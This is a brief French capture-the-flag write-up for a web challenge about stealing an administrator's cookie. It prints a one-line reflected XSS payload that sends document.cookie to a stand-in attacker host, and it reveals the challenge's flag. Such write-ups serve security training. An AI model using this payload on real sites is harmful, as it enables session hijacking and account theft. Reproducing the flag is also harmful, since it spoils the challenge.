
https://hackropole.fr/fr/challenges/web/fcsc2021-web-random-search/
## Description

Pourrez-vous voler le cookie de l’administrateur qui visite les pages ?

## Write Up

En gros c'est une XSS : ```
``` html
http://localhost:8000/index.php?search=<img src=x onerror=window.location="http://monendpoint.evil/cookie=".concat(document.cookie)
```

Le flag est donc **FCSC{4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633}**.